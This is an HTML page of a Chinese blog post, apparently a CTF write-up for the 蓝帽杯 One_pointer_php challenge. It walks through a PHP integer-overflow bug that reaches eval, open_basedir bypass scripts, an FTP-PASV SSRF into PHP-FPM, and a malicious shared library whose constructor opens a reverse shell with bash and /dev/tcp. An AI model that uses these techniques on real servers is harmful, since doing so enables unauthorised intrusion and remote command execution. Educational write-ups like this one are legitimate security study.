@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="[蓝帽杯]One_pointer_php一个玄幻的webpwn，但是我看大家都用FPM成功bypass了，所以复现顺便记录一下 整数溢出第一步是个反序列化，大概是这么个要求 $count[++$user-&gt;count]&#x3D;1; if($count[]&#x3D;1){     ..... } else{     eval() }">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[蓝帽杯]One_pointer_php">
+<meta property="og:url" content="https://blog.z3ratu1.cn/[%E8%93%9D%E5%B8%BD%E6%9D%AF]One_pointer_php.html">
+<meta property="og:site_name" content="Z3ratu1&#39;s blog">
+<meta property="og:description" content="[蓝帽杯]One_pointer_php一个玄幻的webpwn，但是我看大家都用FPM成功bypass了，所以复现顺便记录一下 整数溢出第一步是个反序列化，大概是这么个要求 $count[++$user-&gt;count]&#x3D;1; if($count[]&#x3D;1){     ..... } else{     eval() }">
+<meta property="og:locale">
+<meta property="article:published_time" content="2021-05-05T08:40:57.000Z">
+<meta property="article:modified_time" content="2021-05-21T08:53:42.982Z">
+<meta property="article:author" content="Z3ratu1">
+<meta property="article:tag" content="php">
+<meta property="article:tag" content="bypass_disable_function">
+<meta property="article:tag" content="fpm">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://blog.z3ratu1.cn/[%E8%93%9D%E5%B8%BD%E6%9D%AF]One_pointer_php.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>[蓝帽杯]One_pointer_php | Z3ratu1's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Z3ratu1's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/[%E8%93%9D%E5%B8%BD%E6%9D%AF]One_pointer_php.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+      <meta itemprop="name" content="Z3ratu1">
+      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z3ratu1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [蓝帽杯]One_pointer_php
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-05-05 16:40:57" itemprop="dateCreated datePublished" datetime="2021-05-05T16:40:57+08:00">2021-05-05</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-05-21 16:53:42" itemprop="dateModified" datetime="2021-05-21T16:53:42+08:00">2021-05-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/%5B%E8%93%9D%E5%B8%BD%E6%9D%AF%5DOne_pointer_php.html" class="post-meta-item leancloud_visitors" data-flag-title="[蓝帽杯]One_pointer_php" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/%5B%E8%93%9D%E5%B8%BD%E6%9D%AF%5DOne_pointer_php.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/%5B%E8%93%9D%E5%B8%BD%E6%9D%AF%5DOne_pointer_php.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="蓝帽杯-One-pointer-php"><a href="#蓝帽杯-One-pointer-php" class="headerlink" title="[蓝帽杯]One_pointer_php"></a>[蓝帽杯]One_pointer_php</h1><p>一个玄幻的webpwn，但是我看大家都用FPM成功bypass了，所以复现顺便记录一下</p>
+<h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><p>第一步是个反序列化，大概是这么个要求</p>
+<pre class=" language-php"><code class="language-php"><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">count</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>这样子的赋值形式会直接让其下标递增，我当时想到了整数溢出，但是我本地的环境最高只能到PHP7.2，这个版本及其之前版本下数字过大就直接把下标变成从0开始了，并打不通，远程环境是PHP7.4.1，后来网上找了个在线环境试了一下打通了<br>count等于long最大值-1即可，long最大值为<code>9223372036854775807</code>(63位二进制，留一位符号位)，大概是先++到达最大值，再++的时候整数溢出就崩了吧。PHP7.4下会报一个warning然后赋值失败，用PHP8的环境这里就直接fatal error退出了，往前的版本会无事发生大家直接从0开始。。。利用环境真苛刻<br>如果直接把下标调成long最大值，此时++又不会直接崩盘，而是直接变成负数最小值（就是63位全0然后符号位1那个值），然后if那里的赋值再++之后下标会变成0，真是诡异</p>
+<h2 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h2><p>拿到一个shell之后发现并打不通，phpinfo一看open_basedir+disable_function超级拉满</p>
+<h3 id="ini-set绕过"><a href="#ini-set绕过" class="headerlink" title="ini_set绕过"></a>ini_set绕过</h3><p>open_basedir可以用经典的的ini_set+chdir绕过，先然后mkdir()创建一个子目录，然后再chdir()进去，<code>ini_set(&quot;open_basedir&quot;, &quot;..&quot;)</code>就是合法的，当open_basedir变成<code>..</code>之后，就可以一路chdir(“..”)直达根目录，这时再<code>ini_set(&quot;open_basedir&quot;, &quot;/&quot;)</code>就可以完全绕过open_basedir的限制了<br>一开始直接<code>ini_set(&quot;open_basedir&quot;, &quot;/&quot;)</code>肯定是不给过的，因为根目录不在当前的open_basedir下</p>
+<pre class=" language-php"><code class="language-php"><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string">'z33'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'z33'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">// 想干嘛干嘛</span>
+</code></pre>
+<p>当然这个操作首先需要拥有当前目录写权限，或者存在一个可以cd进去的子目录</p>
+<h3 id="glob协议绕过"><a href="#glob协议绕过" class="headerlink" title="glob协议绕过"></a>glob协议绕过</h3><p>另一种操作，用DirectoryIterator这个类可以查看目录下文件，配合glob协议无视open_basedir（我也不知道为什么），抄一个脚本</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">'&lt;b>open_basedir : %s &lt;/b>&lt;br />'</span><span class="token punctuation">,</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$file_list</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">// normal files</span>
+<span class="token variable">$it</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span>"glob<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///*");</span>
+<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$it</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$file_list</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token comment" spellcheck="true">// special files (starting with a dot(.))</span>
+<span class="token variable">$it</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span>"glob<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///.*");</span>
+<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$it</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$file_list</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token function">sort</span><span class="token punctuation">(</span><span class="token variable">$file_list</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$file_list</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"{$f}&lt;br/>"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<p><code>glob:///*</code>列举根目录下全部文件，列举其他目录的改下目录即可</p>
+<p>扫目录在<code>/etc/nginx/sites-enabled/default</code>中读到配置内容，<code>fastcgi_pass   127.0.0.1:9001;</code>，可以打一个ssrf。预期解法应该是读<code>/usr/local/etc/php/php.ini</code>读到加载了一个extension，然后把那个扩展拉下来逆打pwn吧（好像以前遇到过这个样子的题目）</p>
+<h2 id="disable-function"><a href="#disable-function" class="headerlink" title="disable_function"></a>disable_function</h2><p>还是复现一下FPM的打法，不能老是纸上谈兵（虽然脚本还是继续抄，抄的参考链接里面的）用gopherus也能生成一个payload，不过还得想个办法进行手动发包</p>
+<p>如果能用gopher自然是可以手动控制TCP包的数据，本地测试PHP自带的curl功能是可以发送gopher协议的，不知道是远程环境哪里的问题，curl一用直接500，报错也不给看，不知道是不是这个模块没加载，只能用参考链接的伪造ftp进行通信了<br>FTP一个端口控制一个端口通信，通信端口没有任何的额外数据，所以就和gopher差不多能让我们打一个完全可控的tcp数据流<br>简单的说就是FTP存在一个passive被动服务模式，客户端连上服务器，服务器返回一个ip:port，客户端就开始和那个端口进行通信，注意这里的ip:port是由服务器指定的，所以起一个恶意服务端然后返回127.0.0.1:9001，这样子用户发送的数据流就直接打到本地的FPM上完成命令执行了。<br>先把经典.so传上去</p>
+<pre class=" language-C"><code class="language-C">#define _GNU_SOURCE
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+__attribute__ ((__constructor__)) void preload (void){
+    system("bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'");
+}
+</string.h></stdio.h></stdlib.h></code></pre>
+<p><code>gcc evil.c -fPIC -shared -o evil.so</code> 编译成动态链接库，这个经典.so应该是加载即触发，不需要额外的进行触发操作</p>
+<p>用抄来的脚本搭一个伪ftp服务器，不过他端口那填了个9001好像不符合规范，应该改成35,41，按照规则应该是35*256+41&#x3D;9001这样子比较正常</p>
+<p>递归学习看到了RMB122神仙的博客，他直接看PHP在ftp这边实现的源码了。我光速爬，直接填9001也是可以的，因为PHP在底层处理的时候并没有管这么多，可以说是没有按规则处理，PHP源码在注释中写道在PASV模式下是忽略ip只获取端口的，但实际上操作的时候还是获取了ip，所以我们才能拿这个打一个ssrf，并且FTP的回复也可以有两种，都可以使得PHP的FTP链接进入到PASV模式，蓝帽杯wp里有一种，RMB神仙的博客里是另一种</p>
+<p>现在要让目标连接一下我们的恶意ftp服务，直接使用PHP文件协议原生支持的ftp协议，在file_put_content函数这里发起ftp请求</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">'/tmp/file'</span><span class="token punctuation">;</span>
+    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">':)'</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">.</span><span class="token string">"&lt;/br>"</span><span class="token punctuation">.</span><span class="token variable">$data</span><span class="token punctuation">.</span><span class="token string">"&lt;/br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">// echo file_get_contents($file);</span>
+</code></pre>
+<p>这个代码就是RMB神仙博客里的那道hxp的题，这里打开一个ftp链接，然后直接往这个连接里写东西，因为连上的是我们的恶意服务端，所以返回的写数据的位置就直接是本地的FPM，就可以设置extension_dir和extentsion两个PHP_ADMIN_VALUE加载恶意.so反弹shell了（这里踩了两个巨大的坑。。。。第一个是ftp协议端口后面还要跟一个<code>/</code>，这里一开始半天没打通，第二个是data他这里是$_GET获取的所以提交的时候url编码了，我直接往代码里写忘记解码了。。。。）</p>
+<p>vps上直接起一个假ftp再监听一个端口等shell过来就行了</p>
+<p>弹回来shell之后flag是root:root 700，还差一步提权，<code>find / -perm -u=s</code>就行，找到PHP自己就是setUID程序，直接改一个PHP文件再执行都行（但是还得再用前面的ini_set来bypass一下open_basedir）</p>
+<h3 id="另一个解"><a href="#另一个解" class="headerlink" title="另一个解"></a>另一个解</h3><p>直接用pfsockopen这个函数起socket链接发送原始TCP数据直接打通<br>说实话我觉得这个应该是比较正常的解，PHP怎么可能不能直接发原始tcp数据，disable_function里面ban了一个fsockopen，但是漏了这个，我觉得一开始想到这个才是最正常的吧</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html">PHP绕过open_basedir列目录的研究</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://rmb122.com/2020/12/30/hxp-CTF-resonator-Writeup-SSRF-via-file-put-contents/">hxp CTF resonator Writeup - SSRF via file_put_contents|Rmb122’s Notebook </a>再膜一下<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://mp.weixin.qq.com/s?__biz=MjM5Njc1OTYyNA==&mid=2450777020&idx=1&sn=f9d18ac6a1421de229dd980ec993e40f">第五届“蓝帽杯”全国大学生网络安全技能大赛初赛WriteUp</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://err0r.top/article/bluehat2021/">蓝帽杯2021一道题——One_Pointer_PHP</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/php/" rel="tag"># php</a>
+              <a href="/tags/bypass-disable-function/" rel="tag"># bypass_disable_function</a>
+              <a href="/tags/fpm/" rel="tag"># fpm</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/windows%E4%B8%8B%E7%9A%84%E5%A5%87%E5%A6%99%E6%96%87%E4%BB%B6%E5%90%8D.html" rel="prev" title="windows下的奇妙文件名">
+      <i class="fa fa-chevron-left"></i> windows下的奇妙文件名
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/%5B%E7%BE%8E%E5%9B%A2CTF2021%5Dwp.html" rel="next" title="[美团CTF2021]wp">
+      [美团CTF2021]wp <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%93%9D%E5%B8%BD%E6%9D%AF-One-pointer-php"><span class="nav-number">1.</span> <span class="nav-text">[蓝帽杯]One_pointer_php</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="nav-number">1.1.</span> <span class="nav-text">整数溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#open-basedir"><span class="nav-number">1.2.</span> <span class="nav-text">open_basedir</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ini-set%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.1.</span> <span class="nav-text">ini_set绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#glob%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.2.</span> <span class="nav-text">glob协议绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#disable-function"><span class="nav-number">1.3.</span> <span class="nav-text">disable_function</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%A6%E4%B8%80%E4%B8%AA%E8%A7%A3"><span class="nav-number">1.3.1.</span> <span class="nav-text">另一个解</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">1.4.</span> <span class="nav-text">参考链接</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+  <p class="site-author-name" itemprop="name">Z3ratu1</p>
+  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">145</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
+      <img src="/./images/beian.png" style="display: inline-block;">
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
